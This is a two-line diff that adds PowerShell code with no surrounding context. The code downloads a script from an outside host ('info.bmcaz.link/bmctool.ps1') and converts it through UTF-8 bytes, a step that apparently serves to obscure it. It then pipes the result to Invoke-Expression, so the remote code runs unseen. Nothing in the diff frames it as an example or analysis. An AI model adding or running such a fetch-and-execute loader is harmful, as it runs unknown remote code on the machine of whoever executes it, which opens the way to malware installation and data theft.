@@ -1,0 +1,2 @@
+$bytes = (Invoke-WebRequest -Uri 'info.bmcaz.link/bmctool.ps1').Content | ForEach-Object { [System.Text.Encoding]::UTF8.GetBytes($_) }
+[System.Text.Encoding]::UTF8.GetString($bytes) | Invoke-Expression
